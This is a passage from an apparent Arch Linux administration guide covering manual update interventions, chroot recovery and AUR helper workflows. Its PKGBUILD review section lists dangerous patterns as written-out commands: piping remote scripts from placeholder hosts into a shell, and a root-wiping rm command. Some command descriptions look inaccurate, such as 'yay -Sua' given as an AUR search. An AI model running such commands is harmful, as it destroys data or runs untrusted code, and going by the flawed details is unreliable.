**Manual steps required:**
```
# Update keyring before full upgrade
sudo pacman -Sy archlinux-keyring
sudo pacman -Su
```

**Reason:** Old keys couldn't verify new package signatures.

#### Example 5: Systemd-boot Configuration Change (2024)

**Announcement:** "systemd-boot loader.conf format changes"

**Issue:** Boot loader configuration syntax updated

**Manual steps required:**
```
# Update /boot/loader/loader.conf
# Old:
timeout 3
default arch

# New:
timeout 3
default arch.conf
```

**Reason:** Boot loader wouldn't recognize old format.

### Handling Manual Intervention

#### Step-by-Step Procedure

**1. Check Arch news before updating:**
```
# Visit https://archlinux.org/news/
# Or use RSS reader
# Or check from terminal:
curl -s https://archlinux.org/feeds/news/ | grep -E '<title>|<pubDate>' | head -10
```

**2. Read full announcement:**
- Understand what's changing
- Note required manual steps
- Identify affected systems/configurations

**3. Backup critical **
```
sudo cp -a /etc /backup/etc-$(date +%Y%m%d)
sudo cp -a /boot /backup/boot-$(date +%Y%m%d)
```

**4. Create system snapshot (if available):**
```
sudo timeshift --create --comments "Before manual intervention"
# or
sudo btrfs subvolume snapshot / /.snapshots/pre-intervention-$(date +%Y%m%d)
```

**5. Follow manual steps exactly:**
Execute commands as specified in the announcement.

**6. Proceed with system update:**
```
sudo pacman -Syu
```

**7. Verify system functionality:**
- Check services: `systemctl --failed`
- Verify boot: `journalctl -b -p err`
- Test critical applications

**8. Monitor for issues:**
Watch logs and system behavior for 24-48 hours.

### Common Manual Intervention Patterns

#### Package Rename Pattern

**Scenario:** Package renamed, no automatic transition

**Example announcement:**
```
Package 'old-name' replaced by 'new-name'
Manual action required:
  pacman -S new-name
  pacman -R old-name
```

**Steps:**
```
sudo pacman -S new-name
sudo pacman -Rns old-name
```

#### Configuration File Migration

**Scenario:** Configuration file location or format changed

**Example announcement:**
```
Package-name configuration moved from /etc/old/config to /etc/new/config
Manual migration required for custom configurations.
```

**Steps:**
```
# Backup old config
sudo cp /etc/old/config /etc/old/config.bak

# Copy to new location
sudo cp /etc/old/config /etc/new/config

# Adjust format if needed (check documentation)
sudo nano /etc/new/config

# Test new configuration
sudo systemctl restart service-name

# Remove old config when confirmed working
sudo rm /etc/old/config
```

#### Service Unit Changes

**Scenario:** Systemd unit file changes

**Example announcement:**
```
Service-name.service unit file changed. 
User-created overrides in /etc/systemd/system/ may need updating.
```

**Steps:**
```
# Check for overrides
systemctl cat service-name.service

# Review /etc/systemd/system/ for custom units
ls /etc/systemd/system/service-name.service.d/

# Update overrides to match new format
sudo systemctl edit service-name.service

# Reload systemd
sudo systemctl daemon-reload

# Restart service
sudo systemctl restart service-name
```

#### Library Soname Bump

**Scenario:** Major library version change requiring rebuilds

**Example announcement:**
```
Library libfoo.so.5 updated to libfoo.so.6
AUR packages may need rebuilding.
```

**Steps:**
```
# List foreign packages (AUR)
pacman -Qm

# Rebuild AUR packages
yay -S $(pacman -Qmq) --rebuild
# or
paru -S $(pacman -Qmq) --rebuild

# Check for broken links
sudo ldconfig
ldd /path/to/binary | grep "not found"
```

### Automation and Monitoring

#### News Checking Script

```bash
#!/bin/bash
# /usr/local/bin/check-arch-news

NEWS_URL="https://archlinux.org/feeds/news/"
CACHE_FILE="/tmp/arch-news-cache"

# Fetch current news
CURRENT_NEWS=$(curl -s "$NEWS_URL" | grep '<title>' | head -5)

# Check if news changed
if [ -f "$CACHE_FILE" ]; then
    CACHED_NEWS=$(cat "$CACHE_FILE")
    if [ "$CURRENT_NEWS" != "$CACHED_NEWS" ]; then
        echo "=== NEW ARCH LINUX NEWS DETECTED ==="
        echo "$CURRENT_NEWS"
        echo "=== Visit https://archlinux.org/news/ ==="
        
        # Send notification
        notify-send "Arch News Update" "New announcements available"
    fi
fi

# Update cache
echo "$CURRENT_NEWS" > "$CACHE_FILE"
```

**Schedule with cron:**
```
0 */6 * * * /usr/local/bin/check-arch-news
```

Checks every 6 hours for news updates.

#### Pre-Update Safety Script

```bash
#!/bin/bash
# /usr/local/bin/safe-update

echo "=== Arch Linux Safe Update Script ==="

# 1. Check Arch news
echo "Checking Arch Linux news..."
echo "Visit: https://archlinux.org/news/"
read -p "Have you checked Arch news? (y/n): " CHECKED

if [ "$CHECKED" != "y" ]; then
    echo "Please check Arch news before updating."
    exit 1
fi

# 2. Backup critical directories
echo "Creating backup of /etc..."
sudo cp -a /etc /backup/etc-$(date +%Y%m%d)

# 3. Create snapshot if available
if command -v timeshift &>/dev/null; then
    echo "Creating Timeshift snapshot..."
    sudo timeshift --create --comments "Pre-update $(date +%Y%m%d)"
fi

# 4. Check disk space
FREE_SPACE=$(df / | tail -1 | awk '{print $4}')
if [ $FREE_SPACE -lt 5242880 ]; then  # 5GB in KB
    echo "Warning: Less than 5GB free space"
    read -p "Continue anyway? (y/n): " CONTINUE
    [ "$CONTINUE" != "y" ] && exit 1
fi

# 5. Update keyring first
echo "Updating keyring..."
sudo pacman -Sy archlinux-keyring

# 6. Proceed with system update
echo "Starting system update..."
sudo pacman -Syu

# 7. Check for failed services
echo "Checking for failed services..."
systemctl --failed

echo "=== Update complete ==="
```

### Recovery from Failed Manual Intervention

#### Incomplete Manual Steps

**Problem:** Performed update without completing manual steps

**Symptoms:**
- System won't boot
- Services fail to start
- Applications crash

**Recovery:**

**1. Boot from live USB if necessary**

**2. Chroot into system:**
```
mount /dev/sdXn /mnt
arch-chroot /mnt
```

**3. Review Arch news and complete manual steps:**
Follow the announcement instructions.

**4. Reinstall affected packages:**
```
pacman -S affected-package --overwrite '*'
```

**5. Verify and reboot**

#### Incorrect Manual Steps

**Problem:** Executed manual steps incorrectly

**Recovery:**

**1. Restore backup:**
```
sudo cp -a /backup/etc-20251101/* /etc/
```

**2. Re-read announcement carefully**

**3. Execute correct steps**

**4. Test thoroughly**

### Best Practices

#### Before Updates

**Always check news:** Make it a habit before running `pacman -Syu`.

**Read completely:** Don't skim announcements; understand fully.

**Backup first:** Create backups before any manual intervention.

**Test on non-critical systems:** If possible, test on development machines first.

**Have rescue tools ready:** Keep bootable USB and recovery knowledge available.

#### During Manual Intervention

**Follow exactly:** Execute commands precisely as written.

**Don't improvise:** Stick to official instructions.

**Document actions:** Keep notes on what you did.

**One step at a time:** Complete each step before moving to next.

**Verify each step:** Confirm success before proceeding.

#### After Updates

**Monitor logs:** Watch for errors or warnings.

**Test functionality:** Verify critical services and applications work.

**Check forums:** See if others report issues.

**Keep backups:** Don't delete backups immediately; wait a few days.

**Report problems:** Help community by reporting reproducible issues.

### Resources

**Official news:**
```
https://archlinux.org/news/
```

**Arch Wiki:**
```
https://wiki.archlinux.org/
```

**Forums:**
```
https://bbs.archlinux.org/
```

**Mailing lists:**
```
https://lists.archlinux.org/
```

**IRC:**
```
#archlinux on Libera.Chat
```

Manual intervention scenarios are part of maintaining a rolling-release distribution. Careful attention to announcements and methodical execution of required steps ensures smooth updates without system breakage

## Chroot Environment Operations

### Overview

A chroot (change root) environment allows you to work on an Arch Linux installation from outside the installed system, typically from a live USB. This is essential for system recovery, rescue operations, and advanced maintenance when the system won't boot normally.

### Understanding Chroot

#### What is Chroot?

**Change Root:** Temporarily makes a directory the root filesystem for the current process and its children.

**Use cases:**
- System recovery when system won't boot
- Reinstalling bootloader
- Fixing broken packages
- Completing failed updates
- Repairing corrupted system files

**Limitations:**
- Requires live environment to run from
- Only affects the chrooted process tree
- Virtual filesystems must be manually mounted

### Preparation: Booting Live Environment

#### Boot from Arch Installation Media

**Create bootable USB:**
```
dd if=archlinux.iso of=/dev/sdX bs=4M status=progress
```

**Boot options:**
- Select USB in BIOS/UEFI boot menu
- Wait for live environment prompt
- You'll see a root prompt on the live system

#### Verify Live Environment

```
# Check you're in live environment
uname -a  # Shows Linux kernel
lsblk     # Lists block devices
```

### Mounting the System

#### Identify Partitions

**List all partitions:**
```
lsblk
fdisk -l
```

**Example output:**
```
NAME   MAJ:MIN RM   SIZE RO TYPE MOUNTPOINT
sda      8:0    0 238.5G  0 disk 
├─sda1   8:1    0   512M  0 part     # EFI partition
├─sda2   8:2    0    20G  0 part     # Root partition
└─sda3   8:3    0   218G  0 part     # Home partition
```

#### Mount Root Filesystem

**Mount root partition:**
```
mount /dev/sda2 /mnt
```

Replace `/dev/sda2` with your actual root partition.

**Verify mount:**
```
ls /mnt
```

Should show root filesystem contents (`bin`, `etc`, `home`, `usr`, etc.).

#### Mount Boot Partition (if separate)

**For separate /boot partition:**
```
mount /dev/sda1 /mnt/boot
```

**For UEFI systems with separate EFI partition:**
```
mount /dev/sda1 /mnt/boot/efi
```

Or wherever your EFI partition is mounted.

#### Mount Other Partitions

**Mount /home if separate:**
```
mount /dev/sda3 /mnt/home
```

**Mount swap (if needed for some operations):**
```
swapon /dev/sdaX
```

### Entering Chroot with arch-chroot

#### Using arch-chroot (Recommended)

**Enter chroot environment:**
```
arch-chroot /mnt
```

`arch-chroot` automatically handles mounting required virtual filesystems.

**What arch-chroot does:**
- Mounts `/dev`, `/dev/pts`, `/proc`, `/sys`, `/run`
- Changes root to specified directory
- Executes shell in chroot environment
- Configures environment properly

**You're now in the chroot:**
```
# Prompt changes to indicate chroot
[root@archiso /]#
```

Commands now operate on the mounted system, not the live environment.

### Manual Chroot (Alternative Method)

#### Mount Virtual Filesystems Manually

If `arch-chroot` isn't available:

```
# Mount virtual filesystems
mount --bind /dev /mnt/dev
mount --bind /dev/pts /mnt/dev/pts
mount -t proc /proc /mnt/proc
mount -t sysfs /sys /mnt/sys
mount -t tmpfs /run /mnt/run
```

**For UEFI systems, also mount:**
```
mount -t efivarfs efivarfs /mnt/sys/firmware/efi/efivars
```

#### Enter Chroot

```
chroot /mnt /bin/bash
```

Or:
```
chroot /mnt
```

**Setup environment:**
```
source /etc/profile
export PS1="(chroot) $PS1"
```

### Essential Operations in Chroot

#### Network Configuration

**Copy DNS configuration from live environment:**
```
cp /etc/resolv.conf /mnt/etc/resolv.conf
```

**Or edit manually in chroot:**
```
echo "nameserver 8.8.8.8" > /etc/resolv.conf
```

**Test connectivity:**
```
ping -c 3 archlinux.org
```

**If network isn't working:**
```
# Exit chroot temporarily
exit

# Setup network in live environment
dhcpcd

# Re-enter chroot
arch-chroot /mnt
```

#### Package Operations

**Remove lock file:**
```
rm /var/lib/pacman/db.lck
```

**Refresh databases:**
```
pacman -Syy
```

**Update system:**
```
pacman -Syu
```

**Reinstall packages:**
```
pacman -S package-name --overwrite '*'
```

**Complete failed updates:**
```
pacman -Su
```

#### Kernel Operations

**Reinstall kernel:**
```
pacman -S linux linux-headers
```

**Install LTS kernel:**
```
pacman -S linux-lts linux-lts-headers
```

**Rebuild initramfs:**
```
mkinitcpio -P
```

Or for specific preset:
```
mkinitcpio -p linux
```

#### Bootloader Operations

**GRUB reinstallation:**
```
# Install GRUB package
pacman -S grub

# For BIOS systems
grub-install /dev/sda

# For UEFI systems
grub-install --target=x86_64-efi --efi-directory=/boot/efi --bootloader-id=GRUB

# Generate configuration
grub-mkconfig -o /boot/grub/grub.cfg
```

**systemd-boot reinstallation:**
```
bootctl install
bootctl update

# Verify entries
bootctl list
```

**rEFInd reinstallation:**
```
pacman -S refind
refind-install
```

### Common Recovery Scenarios

#### Scenario 1: Failed System Update

**Problem:** Update interrupted, system won't boot.

**Chroot procedure:**
```
# Mount and chroot
mount /dev/sda2 /mnt
mount /dev/sda1 /mnt/boot
arch-chroot /mnt

# Complete update
rm /var/lib/pacman/db.lck
pacman -Syu

# Verify critical packages
pacman -S linux systemd

# Rebuild initramfs
mkinitcpio -P

# Update bootloader
grub-mkconfig -o /boot/grub/grub.cfg

# Exit and reboot
exit
umount -R /mnt
reboot
```

#### Scenario 2: Broken Bootloader

**Problem:** Bootloader corrupted, system won't start.

**Chroot procedure:**
```
# Mount and chroot
mount /dev/sda2 /mnt
mount /dev/sda1 /mnt/boot/efi  # For UEFI
arch-chroot /mnt

# Reinstall GRUB
pacman -S grub efibootmgr  # For UEFI
grub-install --target=x86_64-efi --efi-directory=/boot/efi --bootloader-id=GRUB
grub-mkconfig -o /boot/grub/grub.cfg

# Exit and reboot
exit
umount -R /mnt
reboot
```

#### Scenario 3: Corrupted System Files

**Problem:** Critical system files corrupted.

**Chroot procedure:**
```
# Mount and chroot
mount /dev/sda2 /mnt
arch-chroot /mnt

# Reinstall base system
pacman -S base base-devel --overwrite '*'

# Reinstall critical packages
pacman -S linux systemd glibc bash coreutils --overwrite '*'

# Verify integrity
pacman -Qkk | grep -v "0 altered files"

# Exit and reboot
exit
umount -R /mnt
reboot
```

#### Scenario 4: Forgotten Root Password

**Problem:** Can't log in, forgot root password.

**Chroot procedure:**
```
# Mount and chroot
mount /dev/sda2 /mnt
arch-chroot /mnt

# Change root password
passwd

# Create/reset user password
passwd username

# Exit and reboot
exit
umount -R /mnt
reboot
```

#### Scenario 5: Kernel Won't Boot

**Problem:** New kernel causes boot failure.

**Chroot procedure:**
```
# Mount and chroot
mount /dev/sda2 /mnt
mount /dev/sda1 /mnt/boot
arch-chroot /mnt

# Downgrade kernel from cache
pacman -U /var/cache/pacman/pkg/linux-old-version.pkg.tar.zst

# Or install LTS kernel
pacman -S linux-lts linux-lts-headers

# Rebuild initramfs
mkinitcpio -P

# Update bootloader
grub-mkconfig -o /boot/grub/grub.cfg

# Exit and reboot
exit
umount -R /mnt
reboot
```

### Advanced Chroot Operations

#### Working with Encrypted Systems

**For LUKS encryption:**
```
# Open encrypted partition
cryptsetup open /dev/sda2 cryptroot

# Mount decrypted partition
mount /dev/mapper/cryptroot /mnt

# Mount boot
mount /dev/sda1 /mnt/boot

# Chroot
arch-chroot /mnt
```

#### Working with LVM

**For LVM systems:**
```
# Activate volume groups
vgchange -ay

# List volumes
lvs

# Mount logical volumes
mount /dev/volumegroup/root /mnt
mount /dev/volumegroup/home /mnt/home
mount /dev/sda1 /mnt/boot

# Chroot
arch-chroot /mnt
```

#### Working with Btrfs Subvolumes

**For Btrfs with subvolumes:**
```
# Mount root subvolume
mount -o subvol=@ /dev/sda2 /mnt

# Mount other subvolumes
mount -o subvol=@home /dev/sda2 /mnt/home
mount -o subvol=@snapshots /dev/sda2 /mnt/.snapshots

# Mount boot
mount /dev/sda1 /mnt/boot

# Chroot
arch-chroot /mnt
```

### Exiting Chroot

#### Proper Exit Procedure

**Exit chroot shell:**
```
exit
```

**Unmount all filesystems:**
```
umount -R /mnt
```

The `-R` flag recursively unmounts all mounted filesystems under `/mnt`.

**Reboot:**
```
reboot
```

**Or shutdown:**
```
poweroff
```

#### Force Unmount (if needed)

**If unmount fails:**
```
umount -l /mnt  # Lazy unmount
```

Or:
```
fuser -km /mnt  # Kill processes using /mnt
umount -R /mnt
```

### Troubleshooting Chroot

#### Cannot Mount Filesystem

**Error:** `mount: /mnt: can't read superblock`

**Solutions:**

**Check filesystem:**
```
fsck /dev/sda2
```

**Check partition table:**
```
fdisk -l /dev/sda
```

**Try different filesystem type:**
```
mount -t ext4 /dev/sda2 /mnt
```

#### Network Not Working

**DNS issues:**
```
# Copy from live environment
cp /etc/resolv.conf /mnt/etc/resolv.conf
```

**No internet in chroot:**
```
# Setup network in live environment first
dhcpcd
ping archlinux.org

# Then chroot
arch-chroot /mnt
```

#### Pacman Signature Errors

**Invalid signatures:**
```
# In chroot
pacman -Sy archlinux-keyring
pacman-key --init
pacman-key --populate archlinux
pacman-key --refresh-keys
```

### Best Practices

**Verify partitions before mounting:** Double-check partition identification with `lsblk`.

**Mount in correct order:** Root first, then boot, then other partitions.

**Use arch-chroot when available:** It handles virtual filesystems automatically.

**Keep live USB updated:** Use recent Arch ISO for compatibility.

**Network setup:** Ensure network works before attempting updates.

**Exit cleanly:** Always exit chroot and unmount properly.

**Document actions:** Keep notes on what you did for future reference.

**Test before rebooting:** Verify critical operations completed successfully.

**Backup first when possible:** If time allows, backup before chroot operations.

**Know your system:** Understand partition layout, encryption, LVM setup, etc.

Chroot operations are powerful recovery tools that enable fixing nearly any Arch Linux system issue without reinstallation, provided the root filesystem is intact.

# AUR Integration

## Understanding Pacman vs AUR Helpers

### Overview

Pacman is Arch Linux's official package manager, handling packages from official repositories. AUR helpers are third-party tools that extend pacman's functionality to work with the Arch User Repository (AUR), providing automated building and installation of user-contributed packages.

### Pacman (Official Package Manager)

#### What Pacman Does

**Core functionality:**
- Installs packages from official repositories (core, extra, multilib)
- Manages package dependencies automatically
- Tracks installed packages in system database
- Handles package upgrades and removals
- Verifies package signatures for security
- Manages configuration files and backups

**Official repositories:**
```
[core]      - Essential system packages
[extra]     - Additional software
[multilib]  - 32-bit libraries for 64-bit systems
```

#### Pacman Limitations

**Cannot handle AUR:**
- Doesn't search AUR packages
- Can't build from PKGBUILD files
- No automatic AUR dependency resolution
- Requires manual intervention for AUR packages

**Manual AUR process with pacman:**
```
# 1. Clone AUR package
git clone https://aur.archlinux.org/package-name.git
cd package-name

# 2. Review PKGBUILD (important for security)
cat PKGBUILD

# 3. Build package
makepkg -si

# Result: pacman installs the built package
```

#### When to Use Pacman Only

**Official packages exclusively:**
```
sudo pacman -S firefox vlc gimp
```

**System maintenance:**
```
sudo pacman -Syu        # System updates
sudo pacman -Rns pkg    # Remove packages
sudo pacman -Ss search  # Search repos
```

**Installing local packages:**
```
sudo pacman -U package.pkg.tar.zst
```

**Critical operations:**
- Base system updates
- Bootloader installation
- Core system components
- Security-critical packages

### AUR (Arch User Repository)

#### What is AUR

**User-contributed repository:**
- Community-maintained package build scripts (PKGBUILDs)
- NOT official Arch packages
- NOT pre-compiled binaries (usually)
- Requires building from source
- Over 85,000 packages available

**AUR package structure:**
```
package-name/
├── PKGBUILD         # Build instructions
├── .SRCINFO         # Package metadata
└── additional files # Patches, configs, etc.
```

#### AUR Security Considerations

**Trust model:**
- Anyone can submit packages to AUR
- No official vetting or security review
- Users must verify PKGBUILD safety themselves
- Potential for malicious code

**Best practices:**
```
# Always review PKGBUILD before building
cat PKGBUILD
less PKGBUILD

# Check package comments for issues
# Visit: https://aur.archlinux.org/packages/package-name
```

**Red flags in PKGBUILDs:**
- `curl | bash` patterns
- Downloading from untrusted sources
- Suspicious commands in prepare/build/package functions
- Obfuscated code

### AUR Helpers

#### What AUR Helpers Do

**Automate AUR workflow:**
- Search both official repos and AUR simultaneously
- Download PKGBUILD files automatically
- Build packages from AUR
- Resolve AUR dependencies
- Update AUR packages alongside official packages
- Some provide interactive PKGBUILD review

**AUR helpers are NOT official:**
- Not supported by Arch developers
- Not in official repositories
- User must choose and maintain them
- Different helpers have different features

#### Popular AUR Helpers

**yay (Yet Another Yogurt):**
```
# Features:
- Written in Go
- Pacman-like syntax
- Interactive search
- Built-in PKGBUILD review
- Development package updates
- Clean build directory support

# Installation:
git clone https://aur.archlinux.org/yay.git
cd yay
makepkg -si
```

**paru:**
```
# Features:
- Written in Rust
- Pacman wrapper
- News checking
- Batch reviewing
- Advanced search
- Clean chroot builds

# Installation:
git clone https://aur.archlinux.org/paru.git
cd paru
makepkg -si
```

**trizen:**
```
# Features:
- Written in Perl
- Lightweight
- Pacman-like interface
- Simple and straightforward

# Installation:
git clone https://aur.archlinux.org/trizen.git
cd trizen
makepkg -si
```

**pikaur:**
```
# Features:
- Written in Python
- Minimal dependencies
- Clean design
- Detailed review process

# Installation:
git clone https://aur.archlinux.org/pikaur.git
cd pikaur
makepkg -si
```

### Comparing Workflows

#### Installing Official Package

**With pacman:**
```
sudo pacman -S firefox
```

**With AUR helper (works identically):**
```
yay -S firefox
paru -S firefox
```

Result: Same - package installed from official repository.

#### Installing AUR Package

**With pacman (manual process):**
```
# 1. Clone
git clone https://aur.archlinux.org/visual-studio-code-bin.git
cd visual-studio-code-bin

# 2. Review PKGBUILD
cat PKGBUILD

# 3. Build and install
makepkg -si
```

**With AUR helper (automated):**
```
yay -S visual-studio-code-bin
# or
paru -S visual-studio-code-bin

# Helper automatically:
- Downloads PKGBUILD
- Shows PKGBUILD for review (optional)
- Builds package
- Installs with pacman
```

#### System Update

**With pacman (official repos only):**
```
sudo pacman -Syu
```

Updates only official repository packages.

**With AUR helper (repos + AUR):**
```
yay -Syu
# or
paru -Syu

# Updates:
- Official repository packages
- AUR packages
- Development packages (with --devel flag)
```

### Key Differences

#### Package Sources

**Pacman:**
- Official repositories only
- Pre-compiled binary packages
- Cryptographically signed
- Officially maintained

**AUR Helpers:**
- Official repositories + AUR
- Builds from source (usually)
- No signature verification for AUR
- Community maintained

#### Security

**Pacman:**
- Signature verification enforced
- Trusted maintainers
- Security updates coordinated
- Official security team oversight

**AUR Helpers:**
- No signature verification for AUR packages
- User responsible for PKGBUILD review
- No security guarantees
- Trust model based on community review

#### Dependency Resolution

**Pacman:**
- Resolves dependencies from official repos
- Cannot resolve AUR dependencies
- Strict dependency enforcement

**AUR Helpers:**
- Resolves official repo dependencies
- Resolves AUR dependencies from AUR
- Builds dependency chain automatically

#### Update Process

**Pacman:**
```
sudo pacman -Syu
# Updates: Official packages only
```

**AUR Helpers:**
```
yay -Syu
# Updates: Official + AUR packages

yay -Syu --devel
# Updates: Official + AUR + development packages
```

### Practical Usage Examples

#### Example 1: Installing Software

**Official package (use either):**
```
# Pacman
sudo pacman -S gimp

# AUR helper (delegates to pacman)
yay -S gimp
```

**AUR package (requires AUR helper or manual):**
```
# Manual with pacman
git clone https://aur.archlinux.org/spotify.git
cd spotify
makepkg -si

# Automated with AUR helper
yay -S spotify
```

#### Example 2: Searching

**Pacman (official repos only):**
```
pacman -Ss firefox
```

**AUR helper (repos + AUR):**
```
yay -Ss firefox
# Shows results from both official repos and AUR
```

#### Example 3: Removing Packages

**Both work identically:**
```
sudo pacman -Rns package-name
yay -Rns package-name
paru -Rns package-name
```

AUR helpers delegate removal to pacman.

#### Example 4: Querying Installed Packages

**Both work identically:**
```
pacman -Q
yay -Q
paru -Q
```

Queries pacman's database.

### Choosing Between Pacman and AUR Helpers

#### Use Pacman When:

**Official packages only:**
- System doesn't need AUR packages
- Security is paramount
- Prefer official support

**Critical operations:**
- Base system installation
- System recovery
- Bootloader configuration
- Core component updates

**Scripting and automation:**
- Pacman has stable, documented interface
- No AUR helper dependencies
- Consistent behavior guaranteed

**Learning Arch Linux:**
- Understanding core package management
- Manual AUR process teaches fundamentals
- Better understanding of package building

#### Use AUR Helper When:

**AUR packages needed:**
- Software not in official repos
- Proprietary software (Spotify, Discord, etc.)
- Development tools
- Niche applications

**Convenience desired:**
- Automated AUR workflow
- Simultaneous official + AUR updates
- Integrated search across repos + AUR

**Many AUR packages:**
- System relies heavily on AUR
- Frequent AUR updates needed
- Managing many community packages

### Best Practices

#### General Principles

**Prefer official repos:** When software is available in official repos, use it instead of AUR versions.

**Review PKGBUILDs:** Always review AUR package build scripts before building, regardless of helper used.

**Keep helpers updated:** Update AUR helpers regularly for bug fixes and security improvements.

**Use one helper:** Don't install multiple AUR helpers; choose one and stick with it.

**Understand what helpers do:** Know that AUR helpers ultimately use makepkg and pacman.

#### Security Practices

**Check package popularity:** Popular AUR packages have more community review.

**Read comments:** AUR package comments often highlight issues or security concerns.

**Verify sources:** Check that source URLs in PKGBUILD are legitimate.

**Build in clean environment:** Some helpers support clean chroot builds for isolation.

**Report suspicious packages:** Flag malicious or problematic AUR packages.

#### Maintenance Practices

**Regular updates:**
```
# With pacman (official only)
sudo pacman -Syu

# With AUR helper (official + AUR)
yay -Syu
```

**Clean build cache:**
```
# Pacman cache
sudo paccache -rk3

# AUR helper cache
yay -Sc
paru -Sc
```

**Remove orphans:**
```
sudo pacman -Rns $(pacman -Qdtq)
```

**Rebuild after library updates:**
```
yay -S $(pacman -Qmq) --rebuild
paru -S $(pacman -Qmq) --rebuild
```

### Common Misconceptions

**"AUR helpers replace pacman"**
- False: AUR helpers wrap pacman, using it for final installation
- Pacman is always the underlying package manager

**"AUR packages are official"**
- False: AUR is community-maintained, not officially supported
- Only core/extra/multilib are official

**"AUR helpers are required for AUR"**
- False: Can use AUR manually with git + makepkg
- Helpers just automate the process

**"All AUR packages are safe"**
- False: AUR packages can contain malicious code
- User responsibility to review before building

**"AUR helpers are officially supported"**
- False: AUR helpers are third-party tools
- Arch developers don't support or maintain them

### Conclusion

**Pacman** is the official, trusted, secure package manager for Arch Linux, handling official repository packages with signature verification and guaranteed quality.

**AUR helpers** are convenient third-party tools that extend pacman's functionality to include AUR packages, automating the build process while maintaining pacman as the underlying installer.

**Best approach:** Use pacman for official packages and system maintenance; use AUR helpers judiciously for community packages while maintaining awareness of security implications and reviewing all PKGBUILDs before building.

## Workflow with AUR Helpers

### Overview

AUR helpers streamline the process of building and installing packages from the Arch User Repository while maintaining integration with pacman for official packages. Understanding proper workflow ensures efficient package management and system security.

### Initial Setup

#### Installing Your First AUR Helper

Since AUR helpers are themselves in the AUR, you must install the first one manually:

**Installing yay (recommended for beginners):**
```bash
# Install base-devel if not already installed
sudo pacman -S --needed base-devel git

# Clone yay repository
git clone https://aur.archlinux.org/yay.git
cd yay

# Review PKGBUILD (important!)
cat PKGBUILD

# Build and install
makepkg -si

# Verify installation
yay --version
```

**Installing paru (alternative):**
```bash
sudo pacman -S --needed base-devel git
git clone https://aur.archlinux.org/paru.git
cd paru
cat PKGBUILD
makepkg -si
paru --version
```

#### Configuration

**yay configuration location:**
```
~/.config/yay/config.json
```

**Generate default config:**
```
yay -Y --gendb
yay -Y --save
```

**Common configuration options:**
```
yay --save --answerclean All --answerdiff None --removemake
```

Options:
- `--answerclean All` - Auto-clean build files
- `--answerdiff None` - Don't show diffs by default
- `--removemake` - Remove make dependencies after build

**paru configuration location:**
```
/etc/paru.conf
~/.config/paru/paru.conf
```

**Example paru.conf:**
```ini
[options]
BottomUp
SudoLoop
NewsOnUpgrade
```

### Basic Workflow Operations

#### Searching for Packages

**Search repos and AUR:**
```
yay -Ss package-name
paru -Ss package-name
```

**Output shows:**
```
extra/package-name 1.0-1
    Official repository package

aur/package-name-git r123.abc123-1 (+50 0.42)
    AUR package description
```

**AUR notation explained:**
- `(+50 0.42)` = 50 votes, 0.42% popularity
- Higher votes/popularity generally indicate trusted packages

**Search AUR only:**
```
yay -Sua package-name
```

#### Installing Packages

**Install from repos or AUR (auto-detect):**
```
yay -S package-name
paru -S package-name
```

**Process:**
1. Helper checks official repos first
2. If not found, searches AUR
3. Downloads PKGBUILD
4. Shows PKGBUILD for review
5. Prompts for confirmation
6. Resolves dependencies
7. Builds package
8. Installs with pacman

**Install multiple packages:**
```
yay -S package1 package2 package3
```

**Skip PKGBUILD review (not recommended):**
```
yay -S package-name --noconfirm
```

#### Package Information

**View package details:**
```
yay -Si package-name
paru -Si package-name
```

Shows:
- Repository/AUR location
- Version
- Dependencies
- Description
- Votes and popularity (AUR)

**View installed package info:**
```
yay -Qi package-name
```

### System Updates

#### Full System Update

**Update official repos + AUR packages:**
```
yay -Syu
paru -Syu
```

**Process:**
1. Syncs official repository databases
2. Checks for AUR package updates
3. Shows all available updates
4. Prompts for confirmation
5. Downloads and builds AUR packages
6. Updates official packages with pacman
7. Installs updated AUR packages

#### Update AUR Packages Only

```
yay -Sua
paru -Sua
```

Updates only AUR packages, skipping official repos.

#### Update Development Packages

Development packages (`-git`, `-svn`, `-hg`, etc.) don't have version numbers, so helpers can't detect updates automatically.

**Update with development packages:**
```
yay -Syu --devel
paru -Syu --devel
```

This rebuilds all development packages to get latest upstream changes.

#### Check for Updates Without Installing

```
yay -Qu
paru -Qu
```

Lists available updates without installing them.

### Package Removal

#### Remove Package

**AUR helpers delegate to pacman:**
```
yay -R package-name
paru -R package-name
```

Same as `sudo pacman -R package-name`.

**Remove with dependencies and configs:**
```
yay -Rns package-name
paru -Rns package-name
```

Recommended for clean removal.

**Remove orphaned packages:**
```
yay -Yc
paru -c
```

Or using pacman directly:
```
sudo pacman -Rns $(pacman -Qdtq)
```

### PKGBUILD Review Workflow

#### Why Review PKGBUILDs

**Security reasons:**
- PKGBUILDs can contain arbitrary commands
- Malicious code could compromise your system
- AUR has no official security review

**Quality reasons:**
- Check package is building correctly
- Verify source URLs are legitimate
- Understand what the package does

#### Reviewing with yay

**During installation:**
```
yay -S package-name
```

yay prompts:
```
:: Proceed with review? [Y/n]: y
```

Opens PKGBUILD in your `$EDITOR`.

**Manual review:**
```
yay -G package-name
```

Downloads PKGBUILD to current directory without building.

**Review without installing:**
```
cd ~/.cache/yay/package-name
cat PKGBUILD
```

#### Reviewing with paru

**During installation:**
```
paru -S package-name
```

paru shows diff and prompts for review.

**Batch review mode:**
```
paru -S package1 package2 package3
```

Reviews all PKGBUILDs before building any.

#### What to Look For

**Legitimate sources:**
```bash
source=("https://github.com/project/archive/$pkgver.tar.gz")
```

Check URL is official project repository.

**Red flags:**
```bash
# Dangerous patterns:
curl http://untrusted.com/script.sh | bash
wget -O - http://site.com/install | sh
rm -rf / --no-preserve-root
```

**Acceptable commands:**
```bash
# Normal build steps:
./configure --prefix=/usr
make
make DESTDIR="$pkgdir" install
```

**Check dependencies:**
```bash
depends=('python' 'gtk3')
makedepends=('rust' 'cargo')
```

Ensure dependencies are reasonable.

### Advanced Operations

#### Clean Build Cache

**yay:**
```
yay -Sc        # Remove uninstalled packages
yay -Scc       # Remove all cached packages
```

**paru:**
```
paru -Sc       # Clean repo cache
paru -Scc      # Clean repo + AUR cache
```

**Cache locations:**
```
~/.cache/yay/
~/.cache/paru/
```

#### Rebuild Packages

After system library updates, rebuild AUR packages:

**Rebuild all foreign packages:**
```
yay -S $(pacman -Qmq) --rebuild
paru -S $(pacman -Qmq) --rebuild
```

**Rebuild specific package:**
```
yay -S package-name --rebuild
```

#### Development Package Updates

**List development packages:**
```
pacman -Qm | grep -E -- '-(git|svn|hg|bzr|cvs|darcs)$'
```

**Update all development packages:**
```
yay -Syu --devel
paru -Syu --devel
```

#### Working with Package Bases

**Download package build files:**
```
yay -G package-name
```

Creates directory with PKGBUILD and related files.

**Edit PKGBUILD and rebuild:**
```
